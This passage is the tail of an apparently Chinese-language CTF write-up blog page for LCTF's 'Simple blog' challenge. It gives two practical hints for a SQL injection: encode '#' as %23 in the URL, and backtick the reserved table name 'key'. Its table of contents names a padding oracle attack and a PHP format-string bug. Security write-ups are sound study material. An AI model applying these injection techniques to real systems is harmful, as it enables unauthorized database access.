+<p><img src="LCTF-Simple-blog-WP/5.png" alt=""></p>
+<p><strong>Note</strong></p>
+<p>这里有两个坑：</p>
+<ul>
+<li><p><code>#</code>号在url编码中为保留字符，浏览器在进行urlencode的时候不会对它进行编码，因此需要手工写成<code>%23</code></p>
+<blockquote>
+<p>如果一个保留字符在特定上下文中具有特殊含义(称作”reserved purpose”) , 且URI中必须使用该字符用于其它目的, 那么该字符必须百分号编码. 百分号编码一个保留字符，首先需要把该字符的ASCII的值表示为两个16进制的数字，然后在其前面放置转义字符(“<code>%</code>“)，置入URI中的相应位置。(对于非ASCII字符, 需要转换为UTF-8字节序, 然后每个字节按照上述方式表示.)</p>
+</blockquote>
+</li>
+<li><p><code>key</code>这个表名是MYSQL保留字，我们把它当做表名带入查询时必须用反引号包起来，不然就会报语法错误而返回不了我们想要的结果。</p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="m3lon WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/26/CTF-练习平台writeup/" rel="next" title="CTF 练习平台writeup">
+                <i class="fa fa-chevron-left"></i> CTF 练习平台writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/25/rblog-writeup/" rel="prev" title="RCTF 2018 rblog writeup">
+                RCTF 2018 rblog writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMzYxOC8xMDE3Mw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/UMR.png" alt="m3lon">
+            
+              <p class="site-author-name" itemprop="name">m3lon</p>
+              <p class="site-description motion-element" itemprop="description">欢迎各位大佬莅临 Hacked By LambdaX...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/CTF/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://d4rkd0g.github.io" title="Lambda" target="_blank">Lambda</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-扫描目录-amp-源码泄露"><span class="nav-number">1.</span> <span class="nav-text">0x01 扫描目录 &amp; 源码泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Padding-Oracle-Attack"><span class="nav-number">2.</span> <span class="nav-text">0x02 Padding Oracle Attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP格式化字符串漏洞"><span class="nav-number">3.</span> <span class="nav-text">PHP格式化字符串漏洞</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m3lon</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
